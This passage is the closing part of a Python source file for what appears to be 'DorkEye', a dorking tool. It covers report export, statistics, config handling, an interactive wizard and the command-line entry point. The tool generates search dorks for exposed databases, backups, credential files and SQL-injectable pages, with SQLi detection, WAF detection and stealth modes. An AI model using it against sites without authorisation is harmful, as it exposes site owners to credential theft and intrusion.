  }}

  else if(fmt==='csv'){{
    const headers=['url','title','dork','category','ext','sqli','conf','waf','timestamp'];
    const esc=v=>{{const s=String(v??'');return s.includes(',')||s.includes('"')||s.includes('\\n')?'"'+s.replace(/"/g,'""')+'"':s;}};
    const csvLines=[headers.join(','),...rows.map(r=>headers.map(h=>esc(r[h]||'')).join(','))];
    _download(csvLines.join('\\r\\n'), base+'.csv', 'text/csv');
    _showToast(`Exported ${{rows.length}} rows → ${{base}}.csv`);
  }}
}}

/* ═══════════════════════════════════════════════
   Init
═══════════════════════════════════════════════ */
buildSubBadges();updateInfoBar();updateExportCounts();
</script>
</body>
</html>"""
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(html)

    def _format_size(self, size):
        if size is None:
            return "N/A"
        size = float(size)
        for unit in ['B', 'KB', 'MB', 'GB']:
            if size < 1024:
                return f"{size:.1f} {unit}"
            size /= 1024
        return f"{size:.1f} TB"

    def print_statistics(self):
        table = Table(title="", show_header=False, box=None, padding=(0, 2))
        table.add_column("Metric", style="cyan")
        table.add_column("Value",  style="green", justify="right")
        console.print("\n[bold yellow]┌─[ Search Statistics ][/bold yellow]")
        console.print("[bold yellow]│[/bold yellow]")
        table.add_row("├─> Total Results Found", str(self.stats.get("total_found", 0)))
        table.add_row("├─> Unique Results",      str(len(self.results)))
        table.add_row("├─> Duplicates Removed",  str(self.stats.get("duplicates", 0)))
        table.add_row("├─> Blacklisted",         str(self.stats.get("blacklisted", 0)))
        if self.config.get("sqli_detection", False):
            table.add_row("├─> SQLi Vulnerabilities", f"[bold red]{self.stats.get('sqli_vulnerable', 0)}[/bold red]")
            table.add_row("├─> WAF Detected",          f"[bold yellow]{self.stats.get('waf_detected', 0)}[/bold yellow]")
        table.add_row("└─> Execution Time", f"{round(time.time() - self.start_time, 2)}s")
        console.print(table)
        categories = {k.replace("category_", ""): v for k, v in self.stats.items() if k.startswith("category_")}
        if categories:
            cat_table = Table(title="", show_header=False, box=None, padding=(0, 2))
            cat_table.add_column("Category", style="cyan")
            cat_table.add_column("Count",    style="green", justify="right")
            console.print("\n[bold yellow]┌─[ Results by Category ][/bold yellow]")
            console.print("[bold yellow]│[/bold yellow]")
            sorted_cats = sorted(categories.items(), key=lambda x: x[1], reverse=True)
            for i, (category, count) in enumerate(sorted_cats):
                prefix = "└─>" if i == len(sorted_cats) - 1 else "├─>"
                cat_table.add_row(f"{prefix} {category.capitalize()}", str(count))
            console.print(cat_table)


# ══════════════════════════════════════════════════════════════
#  Helpers
# ══════════════════════════════════════════════════════════════

def load_config(config_file: str = None) -> Dict:
    if not config_file:
        return DEFAULT_CONFIG.copy()
    try:
        with open(config_file, 'r') as f:
            user_config = json.load(f) if config_file.endswith('.json') else yaml.safe_load(f)
        config = DEFAULT_CONFIG.copy()
        config.update(user_config)
        return config
    except Exception as e:
        console.print(f"[red][!] Error loading config: {e}[/red]")
        console.print("[yellow][!] Using default configuration[/yellow]")
        return DEFAULT_CONFIG.copy()


def create_sample_config():
    config_yaml = """# DorkEye Configuration

extensions:
  documents: [".pdf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx"]
  archives: [".zip", ".rar", ".tar", ".gz", ".7z"]
  databases: [".sql", ".db", ".sqlite", ".mdb"]
  backups: [".bak", ".backup", ".old"]
  configs: [".conf", ".config", ".ini", ".yaml", ".yml", ".json", ".xml"]
  scripts: [".php", ".asp", ".jsp", ".sh"]
  credentials: [".env", ".git", ".htpasswd"]

blacklist: []
whitelist: []
analyze_files: true
sqli_detection: false
http_fingerprinting: true
stealth_mode: false
request_timeout: 10
max_retries: 3
user_agent_rotation: true

# Extended delay triggers after this many total results collected.
extended_delay_every_n_results: 100
"""
    with open("dorkeye_config.yaml", "w") as f:
        f.write(config_yaml)
    console.print("[green][✓] Sample config created: dorkeye_config.yaml[/green]")


def resolve_templates_argument(template_arg):
    templates_dir = Path(__file__).parent / "Templates"
    if template_arg is None:
        return [templates_dir / "dorks_templates.yaml"]
    if template_arg.lower() == "all":
        yaml_files = list(templates_dir.glob("*.yaml"))
        if not yaml_files:
            console.print("[red][!] No template files found in Templates directory[/red]")
            sys.exit(1)
        return yaml_files
    specific_path = templates_dir / template_arg
    if not specific_path.exists():
        console.print(f"[red][!] Template not found: {template_arg}[/red]")
        sys.exit(1)
    return [specific_path]


def get_categories_from_templates(template_files) -> List[str]:
    categories = set()
    for template_file in template_files:
        try:
            with open(template_file, "r", encoding="utf-8") as f:
                data = yaml.safe_load(f)
                if data and "templates" in data:
                    categories.update(data["templates"].keys())
        except Exception as e:
            console.print(f"[yellow][!] Could not read categories from {template_file}: {e}[/yellow]")
    return sorted(categories)


# ══════════════════════════════════════════════════════════════
#  WIZARD
# ══════════════════════════════════════════════════════════════

def run_wizard():
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    print_banner()
    console.print(Panel(
        "[bold green]Interactive Wizard[/bold green] — Navigate with numbers, ENTER to confirm\n"
        "[dim]Press Ctrl+C at any time to abort[/dim]",
        border_style="green",
        title="[bold yellow][ DorkEye Wizard ][/bold yellow]"
    ))

    def ask_yes_no(prompt: str, default_yes: bool = False) -> bool:
        hint = "[Y/n]" if default_yes else "[y/N]"
        console.print(f"[cyan]{prompt} {hint}:[/cyan] ", end="")
        try:
            ans = input("").strip().lower()
        except KeyboardInterrupt:
            return default_yes
        return default_yes if ans == "" else ans in ("y", "yes")

    def ask_choice(prompt: str, options: list, default: int = 0) -> int:
        for i, opt in enumerate(options, 1):
            marker = "[bold green]>[/bold green]" if i - 1 == default else " "
            console.print(f"  {marker} [yellow]{i})[/yellow] {opt}")
        console.print(f"[cyan]{prompt} (default {default+1}):[/cyan] ", end="")
        try:
            raw = input("").strip()
            idx = int(raw) - 1
            return idx if 0 <= idx < len(options) else default
        except (ValueError, KeyboardInterrupt):
            return default

    def ask_string(prompt: str, placeholder: str = "") -> str:
        display = f" [dim](e.g. {placeholder})[/dim]" if placeholder else ""
        console.print(f"[cyan]{prompt}{display}:[/cyan] ", end="")
        try:
            return input("").strip()
        except KeyboardInterrupt:
            return ""

    def ask_extensions(prompt: str) -> list:
        raw = ask_string(prompt, ".pdf .doc .zip")
        if not raw:
            return []
        return [ext if ext.startswith(".") else f".{ext}" for ext in raw.split()]

    def pick_output() -> str:
        output = ask_string("Output filename", "dorkeye_test.html  — press ENTER to skip")
        if not output:
            return None
        if "." in os.path.basename(output):
            return output
        console.print("\n[bold cyan]Output format:[/bold cyan]")
        fmt_idx = ask_choice("Choose format", ["JSON", "CSV", "HTML", "TXT"])
        fmts    = [".json", ".csv", ".html", ".txt"]
        return output + fmts[fmt_idx]

    def collect_run_options(config: dict, ask_count: bool = True) -> int:
        console.print("\n[bold cyan]┌─[ RUN OPTIONS ][/bold cyan]")
        console.print("[bold cyan]│[/bold cyan]")
        count = 50
        if ask_count:
            count_str = ask_string("│  Results per dork", "default 50")
            count     = int(count_str) if count_str.isdigit() else 50
            console.print("[bold cyan]│[/bold cyan]")
        config["sqli_detection"]      = ask_yes_no("│  Enable SQLi detection?")
        config["stealth_mode"]        = ask_yes_no("│  Enable stealth mode?")
        config["http_fingerprinting"] = not ask_yes_no("│  Disable HTTP fingerprinting?")
        config["analyze_files"]       = not ask_yes_no("│  Disable file analysis?")
        if ask_yes_no("│  Set extension blacklist?"):
            config["blacklist"] = ask_extensions("│    Blacklist extensions")
        if ask_yes_no("│  Set extension whitelist?"):
            config["whitelist"] = ask_extensions("│    Whitelist extensions")
        console.print("[bold cyan]└─>[/bold cyan]")
        return count

    MAIN_MENU = [
        ("Google Dork Search",   "Search DuckDuckGo with dork(s)"),
        ("Dork Generator",       "Auto-generate dorks from templates"),
        ("Create sample config", "Write dorkeye_config.yaml to disk"),
        ("Exit",                 ""),
    ]

    while True:
        console.print("\n[bold cyan]┌─[ MAIN MENU ][/bold cyan]")
        for i, (label, desc) in enumerate(MAIN_MENU, 1):
            hint = f"  [dim]{desc}[/dim]" if desc else ""
            console.print(f"[bold cyan]│[/bold cyan]  [yellow]{i})[/yellow] {label}{hint}")
        console.print("[bold cyan]└─>[/bold cyan] ", end="")

        try:
            choice = input("").strip()
        except KeyboardInterrupt:
            console.print("\n[red]Aborted.[/red]")
            return

        if choice == "3":
            create_sample_config()
            continue

        if choice == "4":
            EXIT_MESSAGES = [
                ("Logs don't lie. Neither do we.", "dim"),
                ("Close the terminal. Not the curiosity.", "bold green"),
                ("Stay ghost.", "bold cyan"),
                ("What you found stays between you and the data.", "dim"),
                ("The internet remembers. Do you?", "bold yellow"),
                ("Session closed. Footprints: yours to manage.", "dim"),
                ("Offline is the new safe.", "bold magenta"),
                ("Until next time. Watch your back.", "bold red"),
                ("The dork never sleeps. You can.", "dim"),
                ("Cover your tracks.", "bold cyan"),
                ("Good hunt.", "bold green"),
                ("VPN off? Bad idea.", "bold red"),
                ("They're still out there. So are the vulnerabilities.", "dim"),
                ("Knowledge is the only payload that matters.", "bold yellow"),
                ("Exit clean.", "bold cyan"),
            ]
            msg, color = random.choice(EXIT_MESSAGES)
            console.print(f"[{color}]{msg}[/{color}]")
            return

        config = load_config(None)

        if choice == "1":
            console.print("\n[bold cyan]┌─[ GOOGLE DORK SEARCH ][/bold cyan]")
            console.print("[bold cyan]│[/bold cyan]  [yellow]0)[/yellow] [dim]← Back to main menu[/dim]")
            console.print("[bold cyan]│[/bold cyan]  [yellow]1)[/yellow] Single dork  [dim](type a dork string)[/dim]")
            console.print("[bold cyan]│[/bold cyan]  [yellow]2)[/yellow] Load from file  [dim](.txt, one dork per line)[/dim]")
            console.print("[bold cyan]└─>[/bold cyan] ", end="")

            try:
                sub = input("").strip()
            except KeyboardInterrupt:
                console.print("\n[red]Aborted.[/red]")
                return

            if sub == "0":
                continue
            if sub == "1":
                dork_input = ask_string("Enter dork string")
                if not dork_input:
                    console.print("[red][!] Empty dork. Aborting.[/red]")
                    continue
            elif sub == "2":
                dork_input = ask_string("Path to .txt file")
                if not os.path.isfile(dork_input):
                    console.print(f"[red][!] File not found: {dork_input}[/red]")
                    continue
            else:
                console.print("[red][!] Invalid choice.[/red]")
                continue

            count   = collect_run_options(config, ask_count=True)
            output  = pick_output()
            dorkeye = DorkEyeEnhanced(config, output)
            dorks   = dorkeye.process_dorks(dork_input)
            console.print(f"\n[bold cyan]┌─[ LOADED {len(dorks)} DORK(s) ][/bold cyan]")
            console.print("[bold cyan]└─>[/bold cyan] Starting ...\n")
            try:
                dorkeye.run_search(dorks, count)
            except KeyboardInterrupt:
                console.print("\n[red][!] Search interrupted.[/red]")
            dorkeye.print_statistics()
            if output:
                console.print(f"\n[bold green][✓] Results saved: {output}[/bold green]")
            continue

        if choice == "2":
            console.print("\n[bold cyan]┌─[ DORK GENERATOR — TEMPLATE ][/bold cyan]")
            console.print("[bold cyan]│[/bold cyan]  [yellow]0)[/yellow] [dim]← Back to main menu[/dim]")
            console.print("[bold cyan]│[/bold cyan]  [yellow]1)[/yellow] Default template")
            console.print("[bold cyan]│[/bold cyan]  [yellow]2)[/yellow] All templates")
            console.print("[bold cyan]│[/bold cyan]  [yellow]3)[/yellow] Specific template file")
            console.print("[bold cyan]└─>[/bold cyan] ", end="")

            try:
                tmpl_choice = input("").strip()
            except KeyboardInterrupt:
                console.print("\n[red]Aborted.[/red]")
                return

            if tmpl_choice == "0":
                continue
            if tmpl_choice == "1":
                template_files = resolve_templates_argument(None)
            elif tmpl_choice == "2":
                template_files = resolve_templates_argument("all")
            elif tmpl_choice == "3":
                tmpl_name = ask_string("Template filename", "dorks_templates.yaml")
                if not tmpl_name:
                    console.print("[red][!] No filename given.[/red]")
                    continue
                template_files = resolve_templates_argument(tmpl_name)
            else:
                console.print("[red][!] Invalid choice.[/red]")
                continue

            VALID_CATEGORIES = get_categories_from_templates(template_files)
            if not VALID_CATEGORIES:
                console.print("[red][!] No categories found in templates.[/red]")
                continue

            console.print("\n[bold cyan]┌─[ DORK GENERATOR — CATEGORY ][/bold cyan]")
            console.print("[bold cyan]│[/bold cyan]  [yellow]0)[/yellow] ALL categories")
            for i, cat in enumerate(VALID_CATEGORIES, 1):
                console.print(f"[bold cyan]│[/bold cyan]  [yellow]{i})[/yellow] {cat}")
            console.print("[bold cyan]└─>[/bold cyan] ", end="")

            try:
                cat_choice = input("").strip()
            except KeyboardInterrupt:
                console.print("\n[red]Aborted.[/red]")
                return

            if cat_choice == "0":
                selected_categories = VALID_CATEGORIES
            else:
                try:
                    idx                 = int(cat_choice) - 1
                    selected_categories = [VALID_CATEGORIES[idx]]
                except (ValueError, IndexError):
                    console.print("[red][!] Invalid selection.[/red]")
                    continue

            console.print("\n[bold cyan]┌─[ DORK GENERATOR — MODE ][/bold cyan]")
            mode_idx = ask_choice(
                "Choose mode",
                ["soft  (safe, minimal footprint)", "medium  (balanced coverage)", "aggressive  (maximum coverage)"]
            )
            mode = VALID_MODES[mode_idx]

            collect_run_options(config, ask_count=False)
            output = pick_output()

            all_dorks = []
            for template_file in template_files:
                generator = DorkGenerator(str(template_file))
                all_dorks.extend(generator.generate(categories=selected_categories, mode=mode))

            console.print(f"\n[cyan][*] Generated {len(all_dorks)} dorks (mode: {mode})[/cyan]")
            console.print(f"[cyan][*] Categories: {', '.join(selected_categories)}[/cyan]")
            console.print(f"\n[bold cyan]┌─[ LOADED {len(all_dorks)} DORK(s) ][/bold cyan]")
            console.print("[bold cyan]└─>[/bold cyan] Starting ...\n")

            dorkeye = DorkEyeEnhanced(config, output)
            try:
                dorkeye.run_search(all_dorks, 50)
            except KeyboardInterrupt:
                console.print("\n[red][!] Search interrupted.[/red]")
            dorkeye.print_statistics()
            if output:
                console.print(f"\n[bold green][✓] Results saved: {output}[/bold green]")
            continue

        console.print("[red][!] Invalid option.[/red]")


# ══════════════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════════════

def main():
    if "--wizard" in sys.argv:
        greet_user()
        run_wizard()
        return

    greet_user()

    parser = argparse.ArgumentParser(
        description="DorkEye v4.6 | OSINT Dorking Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""Examples:

  # Interactive wizard
    %(prog)s --wizard

  # Dork(s) Search
    %(prog)s -d "site:example.com filetype:pdf" -o results.json
    %(prog)s -d dorks.txt -c 100 -o output.html

  # Dork Generator
    %(prog)s --dg=all
    %(prog)s --dg=sqli --mode=medium --sqli --stealth -o results.html
    %(prog)s --dg=backups --templates=dorks_templates_research.yaml -o output.html
    %(prog)s --dg=all --templates=dorks_template.yaml -o output.html
    %(prog)s --dg=sqli --mode=aggressive --templates=dorks_templates.yaml --sqli --stealth -o report.html

"""
    )

    parser.add_argument("--wizard",          action="store_true", help="Launch interactive wizard")
    parser.add_argument("-d", "--dork",      help="Single dork or file containing dorks")
    parser.add_argument("-o", "--output",    help="Output filename (with extension: .json .csv .html .txt)")
    parser.add_argument("-c", "--count",     type=int, default=50, help="Results per dork (default: 50)")
    parser.add_argument("--config",          help="Configuration file (YAML or JSON)")
    parser.add_argument("--no-analyze",      action="store_true", help="Disable file analysis")
    parser.add_argument("--sqli",            action="store_true", help="Enable SQL injection detection")
    parser.add_argument("--stealth",         action="store_true", help="Enable stealth mode (slower, safer)")
    parser.add_argument("--no-fingerprint",  action="store_true", help="Disable HTTP fingerprinting")
    parser.add_argument("--templates",       type=str, help="Template file in Templates/ (--templates=filename.yaml or --templates=all)")
    parser.add_argument("--dg",              action="append", nargs="?", const="all", help="Activate Dork Generator (optional: =category)")
    parser.add_argument("--mode",            nargs="?", const="soft", default="soft", help="Generation mode: soft | medium | aggressive")
    parser.add_argument("--blacklist",       nargs="+", help="Extensions to blacklist (e.g. .pdf .doc)")
    parser.add_argument("--whitelist",       nargs="+", help="Extensions to whitelist (e.g. .pdf .xls)")
    parser.add_argument("--create-config",   action="store_true", help="Create sample configuration file")

    args = parser.parse_args()

    for arg in sys.argv:
        if arg.startswith("--templates") and not arg.startswith("--templates="):
            console.print("[red][!] Use --templates=filename.yaml format (no spaces)[/red]")
            sys.exit(1)

    template_files_for_validation = resolve_templates_argument(args.templates)
    VALID_CATEGORIES = get_categories_from_templates(template_files_for_validation)

    if not VALID_CATEGORIES:
        parser.error("No categories found in template files.")

    selected_categories = None
    if args.dg:
        if len(args.dg) > 1:
            parser.error("Multiple --dg arguments are not allowed.")
        dg_value = args.dg[0]
        if dg_value == "all":
            selected_categories = VALID_CATEGORIES
        else:
            if dg_value not in VALID_CATEGORIES:
                parser.error(f"Invalid category '{dg_value}'. Available: {', '.join(VALID_CATEGORIES)}")
            selected_categories = [dg_value]

    if args.mode not in VALID_MODES:
        parser.error(f"Invalid mode '{args.mode}'. Available: {', '.join(VALID_MODES)}")

    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    print_banner()

    if args.create_config:
        create_sample_config()
        return

    if not args.dork and not args.dg:
        parser.print_help()
        return

    config = load_config(args.config)

    if args.no_analyze:     config["analyze_files"]       = False
    if args.sqli:           config["sqli_detection"]      = True
    if args.stealth:        config["stealth_mode"]        = True
    if args.no_fingerprint: config["http_fingerprinting"] = False
    if args.blacklist:      config["blacklist"]            = args.blacklist
    if args.whitelist:      config["whitelist"]            = args.whitelist

    # Default output: report_YYYYMMDD_HHMMSS.html when -o is not specified
    output_file = args.output
    if not output_file:
        output_file = f"report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
        console.print(
            f"[dim][~] No -o specified — saving to [bold]{output_file}[/bold][/dim]"
        )

    dorkeye = DorkEyeEnhanced(config, output_file)

    if args.dg:
        template_files = resolve_templates_argument(args.templates)
        console.print(f"[cyan][*] Loaded template(s): {', '.join([t.name for t in template_files])}[/cyan]")
        all_dorks = []
        for template_file in template_files:
            generator = DorkGenerator(str(template_file))
            all_dorks.extend(generator.generate(categories=selected_categories, mode=args.mode))
        dorks = all_dorks
        console.print(f"[cyan][*] Generated {len(dorks)} dorks (mode: {args.mode})[/cyan]")
        if selected_categories:
            console.print(f"[cyan][*] Categories: {', '.join(selected_categories)}[/cyan]")
    else:
        dorks = dorkeye.process_dorks(args.dork)

    console.print(f"[bold cyan]┌─[ LOADED {len(dorks)} DORK(s) ][/bold cyan]")
    console.print(f"[bold cyan]└─>[/bold cyan] Starting ... \n")

    try:
        dorkeye.run_search(dorks, args.count)
    except KeyboardInterrupt:
        console.print("\n[red][!] Search interrupted by user![/red]")

    dorkeye.print_statistics()

    console.print(f"\n[bold green][✓] Results saved → Dump/{output_file}[/bold green]")


if __name__ == "__main__":
    main()
